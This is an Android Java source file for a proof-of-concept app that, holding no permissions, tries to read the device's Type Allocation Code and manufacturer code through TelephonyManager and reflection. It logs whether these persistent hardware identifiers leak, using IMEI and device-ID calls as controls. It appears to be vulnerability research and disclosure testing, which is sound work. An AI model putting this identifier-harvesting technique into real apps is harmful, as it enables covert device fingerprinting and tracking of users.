package com.poc.phoneidleak;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.os.Process;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import android.view.Gravity;

import java.lang.reflect.Method;

public class MainActivity extends Activity {

    private static final String TAG = "PhoneIdLeak";
    private TextView mOutput;
    private StringBuilder mLog = new StringBuilder();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(32, 48, 32, 32);

        TextView title = new TextView(this);
        title.setText("PH-1/PH-2: Zero-Permission Device ID Leak");
        title.setTextSize(16);
        title.setGravity(Gravity.CENTER);
        root.addView(title);

        TextView info = new TextView(this);
        info.setText("ZERO permissions. Attempts to read TAC (Type Allocation Code) "
                + "and Manufacturer Code — persistent hardware identifiers.");
        info.setTextSize(11);
        info.setPadding(0, 16, 0, 24);
        root.addView(info);

        ScrollView scroll = new ScrollView(this);
        mOutput = new TextView(this);
        mOutput.setTextSize(11);
        mOutput.setTypeface(android.graphics.Typeface.MONOSPACE);
        mOutput.setPadding(8, 8, 8, 8);
        scroll.addView(mOutput);
        root.addView(scroll, new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 0, 1.0f));

        setContentView(root);

        log("=== PH-1/PH-2: Phone ID Leak PoC ===");
        log("Package: " + getPackageName());
        log("UID: " + Process.myUid());
        log("Permissions: NONE");
        log("");

        runTests();
    }

    private void runTests() {
        TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);

        // Test 1: getTypeAllocationCode (PH-1)
        log("--- Test 1: getTypeAllocationCode() [PH-1] ---");
        log("Expected: SecurityException (requires READ_PRIVILEGED_PHONE_STATE)");
        try {
            String tac = tm.getTypeAllocationCode();
            if (tac != null && !tac.isEmpty()) {
                log("[VULN] TAC returned: " + tac);
                log("  → This is the first 8 digits of IMEI!");
                log("  → Identifies exact device model/manufacturer");
                log("  → Persistent hardware identifier leaked WITHOUT permission!");
            } else {
                log("[SAFE] Returned null/empty (permission enforced or no SIM)");
            }
        } catch (SecurityException e) {
            log("[SAFE] SecurityException: " + e.getMessage());
        } catch (Exception e) {
            log("[ERROR] " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }

        log("");

        // Test 2: getTypeAllocationCode(int slotIndex) — slot 0
        log("--- Test 2: getTypeAllocationCode(0) [PH-1 variant] ---");
        try {
            Method m = TelephonyManager.class.getMethod("getTypeAllocationCode", int.class);
            String tac = (String) m.invoke(tm, 0);
            if (tac != null && !tac.isEmpty()) {
                log("[VULN] TAC for slot 0: " + tac);
            } else {
                log("[INFO] Returned null/empty for slot 0");
            }
        } catch (SecurityException e) {
            log("[SAFE] SecurityException: " + e.getMessage());
        } catch (java.lang.reflect.InvocationTargetException e) {
            Throwable cause = e.getCause();
            if (cause instanceof SecurityException) {
                log("[SAFE] SecurityException: " + cause.getMessage());
            } else {
                log("[ERROR] " + (cause != null ? cause.getClass().getSimpleName() + ": " + cause.getMessage() : e.getMessage()));
            }
        } catch (NoSuchMethodException e) {
            log("[INFO] Method not found (may be hidden API)");
        } catch (Exception e) {
            log("[ERROR] " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }

        log("");

        // Test 3: getManufacturerCode (PH-2)
        log("--- Test 3: getManufacturerCode() [PH-2] ---");
        log("Expected: SecurityException (requires READ_PRIVILEGED_PHONE_STATE)");
        try {
            Method m = TelephonyManager.class.getMethod("getManufacturerCode");
            String mfr = (String) m.invoke(tm);
            if (mfr != null && !mfr.isEmpty()) {
                log("[VULN] Manufacturer code: " + mfr);
                log("  → Partial MEID leaked WITHOUT permission!");
                log("  → Combined with TAC provides strong device fingerprint");
            } else {
                log("[INFO] Returned null/empty");
            }
        } catch (SecurityException e) {
            log("[SAFE] SecurityException: " + e.getMessage());
        } catch (java.lang.reflect.InvocationTargetException e) {
            Throwable cause = e.getCause();
            if (cause instanceof SecurityException) {
                log("[SAFE] SecurityException: " + cause.getMessage());
            } else {
                log("[ERROR] " + (cause != null ? cause.getClass().getSimpleName() + ": " + cause.getMessage() : e.getMessage()));
            }
        } catch (NoSuchMethodException e) {
            log("[INFO] Method not found — trying getManufacturerCode(int)");
            tryManufacturerCodeSlot(tm);
        } catch (Exception e) {
            log("[ERROR] " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }

        log("");

        // Test 4: getManufacturerCode(int slotIndex) — slot 0
        log("--- Test 4: getManufacturerCode(0) [PH-2 variant] ---");
        tryManufacturerCodeSlot(tm);

        log("");

        // Test 5: Control — getImei() should FAIL
        log("--- Control: getImei() (should require READ_PRIVILEGED_PHONE_STATE) ---");
        try {
            String imei = tm.getImei();
            log("[UNEXPECTED] IMEI returned: " + imei);
        } catch (SecurityException e) {
            log("[EXPECTED] SecurityException: " + e.getMessage());
            log("  → IMEI is correctly protected");
        } catch (Exception e) {
            log("[INFO] " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }

        log("");

        // Test 6: getDeviceId (legacy, should also fail)
        log("--- Control: getDeviceId() (deprecated, should fail) ---");
        try {
            Method m = TelephonyManager.class.getMethod("getDeviceId");
            String did = (String) m.invoke(tm);
            log("[UNEXPECTED] DeviceId: " + did);
        } catch (SecurityException e) {
            log("[EXPECTED] SecurityException (correctly protected)");
        } catch (java.lang.reflect.InvocationTargetException e) {
            Throwable cause = e.getCause();
            if (cause instanceof SecurityException) {
                log("[EXPECTED] SecurityException (correctly protected)");
            } else {
                log("[INFO] " + (cause != null ? cause.getMessage() : e.getMessage()));
            }
        } catch (Exception e) {
            log("[INFO] " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }

        log("\n=== Summary ===");
        log("If TAC or ManufacturerCode returned non-null values,");
        log("the device leaks hardware identifiers to zero-permission apps.");
        log("TAC = first 8 digits of IMEI → device model identification");
        log("ManufacturerCode = MEID portion → persistent tracking");
    }

    private void tryManufacturerCodeSlot(TelephonyManager tm) {
        try {
            Method m = TelephonyManager.class.getMethod("getManufacturerCode", int.class);
            String mfr = (String) m.invoke(tm, 0);
            if (mfr != null && !mfr.isEmpty()) {
                log("[VULN] Manufacturer code (slot 0): " + mfr);
            } else {
                log("[INFO] Returned null/empty for slot 0");
            }
        } catch (SecurityException e) {
            log("[SAFE] SecurityException: " + e.getMessage());
        } catch (java.lang.reflect.InvocationTargetException e) {
            Throwable cause = e.getCause();
            if (cause instanceof SecurityException) {
                log("[SAFE] SecurityException: " + cause.getMessage());
            } else {
                log("[ERROR] " + (cause != null ? cause.getClass().getSimpleName() + ": " + cause.getMessage() : e.getMessage()));
            }
        } catch (NoSuchMethodException e) {
            log("[INFO] getManufacturerCode(int) not found");
        } catch (Exception e) {
            log("[ERROR] " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        mLog.append(msg).append("\n");
        if (mOutput != null) {
            mOutput.setText(mLog.toString());
        }
    }
}
